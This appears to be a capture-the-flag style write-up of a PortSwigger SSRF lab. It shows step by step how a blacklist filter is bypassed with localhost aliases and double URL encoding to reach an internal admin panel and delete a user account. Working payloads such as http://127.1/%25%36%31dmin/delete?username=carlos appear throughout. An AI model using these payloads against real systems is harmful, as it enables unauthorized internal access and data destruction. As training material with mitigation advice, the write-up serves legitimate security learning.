# SSRF with Blacklist-Based Input Filter

## 📌 Lab Overview

This lab demonstrates a **Server-Side Request Forgery (SSRF)** vulnerability where the application attempts to protect internal resources using a **blacklist-based filter**.

The application allowed users to supply a URL that the backend server would request. To prevent SSRF attacks, the developers attempted to block dangerous values such as:

```text
localhost
/admin
127.0.0.1
```

However, the blacklist implementation was flawed and could be bypassed using:

- alternative localhost representations
- URL encoding tricks
- double URL encoding
- filter evasion techniques

This lab focused on:

- SSRF exploitation
- blacklist bypass techniques
- URL encoding
- double URL encoding
- access to internal resources

---

# 🔍 What is a Blacklist Filter?

A blacklist filter works by blocking specific words, characters, or patterns.

Example:

```text
Blocked:
localhost
admin
127.0.0.1
```

If a request contains one of these values:

```text
http://localhost/admin
```

the application rejects it.

---

## ⚠ Why Are Blacklists Weak?

Blacklists only block values developers know about.

Attackers can often use:

```text
Alternative representations
Encoding tricks
Case variations
Different URL formats
```

to bypass them.

Example:

```text
localhost
```

may be blocked, but:

```text
127.1
```

or

```text
2130706433
```

may still resolve to localhost.

This makes blacklist-based security unreliable.

---

# 🎯 Objective

The goal of this lab was to:

- bypass the SSRF blacklist
- access the internal admin panel
- locate the delete functionality
- delete Carlos's account

---

# 🖼 Step-by-Step Walkthrough

## Screenshot 1 — Normal Webpage

![Screenshot 1](screenshot-ssrf-filter1.png)

The application displayed:

- multiple products
- a **View Details** button for each product

---

## Screenshot 2 — Accessing Product Details

![Screenshot 2](screenshot-ssrf-filter2.png)

I clicked a product's **View Details** button.

The page contained:

- product information
- a **Check Stock** button

After clicking it, the application responded:

```text
311 units
```

This suggested the stock information was being retrieved dynamically from another service.

---

## Screenshot 3 — Capturing the Stock Request

![Screenshot 3](screenshot-ssrf-filter3.png)

I captured the stock-check request.

```http
POST /product/stock
```

Parameter:

```text
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

This revealed that the backend server was making an HTTP request to the supplied URL.

This is a classic SSRF attack surface.

---

## Screenshot 4 — Attempting Localhost Access

![Screenshot 4](screenshot-ssrf-filter4.png)

I replaced the URL with:

```text
http://localhost/admin
```

Result:

```text
400 Bad Request
```

Error:

```text
External stock check blocked for security reasons
```

This indicated that the application was filtering SSRF payloads.

---

## Screenshot 5 — Looking for Alternative Localhost Formats

![Screenshot 5](screenshot-ssrf-filter5.png)

I searched for alternative representations of localhost.

One common format is:

```text
2130706433
```

which is simply:

```text
127.0.0.1
```

expressed as a decimal integer.

---

## Screenshot 6 — Trying Decimal Localhost

![Screenshot 6](screenshot-ssrf-filter6.png)

I modified the URL:

```text
http://2130706433/admin
```

The request was still blocked.

This suggested the filter was catching multiple localhost representations.

---

## Screenshot 7 — Trying Shortened Loopback Notation

![Screenshot 7](screenshot-ssrf-filter7.png)

Next, I tried:

```text
http://127.1/admin
```

This is another valid representation of:

```text
127.0.0.1
```

However, the request was still blocked.

This suggested that not only localhost but also the `/admin` path was being filtered.

---

## Screenshot 8 — Testing Parameter Manipulation

![Screenshot 8](screenshot-ssrf-filter8.png)

I experimented with modifying the original URL:

```text
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=&admin=1
```

The request remained blocked.

At this point it became clear that the application was specifically filtering the string:

```text
admin
```

rather than simply validating URLs.

---

## Screenshot 9 — Single URL Encoding Attempt

![Screenshot 9](screenshot-ssrf-filter9.png)

I encoded the letter:

```text
a
```

inside:

```text
admin
```

Result:

```text
%61dmin
```

Payload:

```text
http://127.1/%61dmin
```

The request was still blocked.

---

# 🔍 Understanding the Encoding Logic

The application likely performed:

```text
URL Decode
↓
Blacklist Check
↓
Request
```

When the backend decoded:

```text
%61
```

it immediately became:

```text
a
```

Therefore:

```text
%61dmin
```

became:

```text
admin
```

before reaching the blacklist.

The filter successfully detected it.

---

## Screenshot 10 — Double URL Encoding Bypass

![Screenshot 10](screenshot-ssrf-filter10.png)

I then used:

```text
%25%36%31dmin
```

Payload:

```text
http://127.1/%25%36%31dmin
```

Result:

```http
200 OK
```

Success.

---

# 🔍 Why Did Double Encoding Work?

Let's break it down.

### First Encoding

```text
a
↓
%61
```

### Second Encoding

The percent sign itself gets encoded:

```text
%61
↓
%25%36%31
```

Result:

```text
%25%36%31dmin
```

---

### What Happens on the Server?

The filter performs one decode:

```text
%25%36%31dmin
↓
%61dmin
```

Blacklist check:

```text
%61dmin
```

This does **not** match:

```text
admin
```

so it passes.

Later the URL is decoded again by the HTTP client:

```text
%61dmin
↓
admin
```

Result:

```text
/ admin
```

The backend reaches the protected endpoint.

This is a classic **double URL encoding bypass**.

---

## Screenshot 11 — Accessing the Admin Panel

![Screenshot 11](screenshot-ssrf-filter11.png)

After bypassing the filter, I rendered the response.

The internal admin panel became visible.

Users:

```text
wiener
carlos
```

Each account had a delete option.

---

## Screenshot 12 — Finding Carlos's Delete Endpoint

![Screenshot 12](screenshot-ssrf-filter12.png)

While reviewing the HTML response, I found:

```html
<a href="/admin/delete?username=carlos">
```

This revealed the endpoint needed to delete Carlos.

---

## Screenshot 13 — Triggering Account Deletion

![Screenshot 13](screenshot-ssrf-filter13.png)

I modified the SSRF payload:

```text
http://127.1/%25%36%31dmin/delete?username=carlos
```

Response:

```http
302 Found
```

This indicated the backend successfully executed the request.

---

## Screenshot 14 — Lab Solved

![Screenshot 14](screenshot-ssrf-filter14.png)

The backend requested:

```text
/admin/delete?username=carlos
```

Carlos's account was deleted successfully.

The lab was solved.

---

# ⚠ Why This Vulnerability Exists

The vulnerability existed because the application relied on:

```text
Blacklist Filtering
```

instead of proper validation.

The filter attempted to block:

```text
localhost
admin
```

but failed to account for:

```text
127.1
Double Encoding
Alternative URL Formats
```

As a result, internal resources remained accessible.

---

# 💥 Impact

An attacker could potentially:

- access internal services
- reach admin panels
- bypass network segmentation
- interact with backend systems
- delete user accounts
- perform internal reconnaissance
- pivot deeper into infrastructure

---

# 🛡 Mitigation

To prevent this issue:

- use allowlists instead of blacklists
- validate URLs strictly
- normalize URLs before validation
- block internal IP ranges
- block localhost access
- reject encoded bypass attempts
- separate internal and external services
- implement network-level SSRF protections

---

# 🧠 Skills Learned

- SSRF Testing
- Blacklist Bypass Techniques
- URL Encoding
- Double URL Encoding
- Internal Resource Discovery
- Localhost Representation Bypasses
- Admin Panel Enumeration

---

# 🧰 Tools Used

- Burp Suite
- Burp Repeater
- Browser Developer Tools
- URL Encoding Techniques
- PortSwigger Web Security Academy

---

# ✅ Conclusion

This lab demonstrated how blacklist-based SSRF protections can be bypassed using encoding tricks and alternative localhost representations.

By understanding how URL decoding occurs at different stages of request processing, I was able to bypass the application's blacklist, access an internal admin panel, and trigger administrative functionality.

Through this lab, I learned:

- why blacklist filtering is unreliable
- how double URL encoding works
- how SSRF filters are commonly bypassed
- how internal services can be reached through SSRF

The lab was successfully solved by exploiting a flawed blacklist implementation and using a double URL encoding bypass to access protected internal resources.
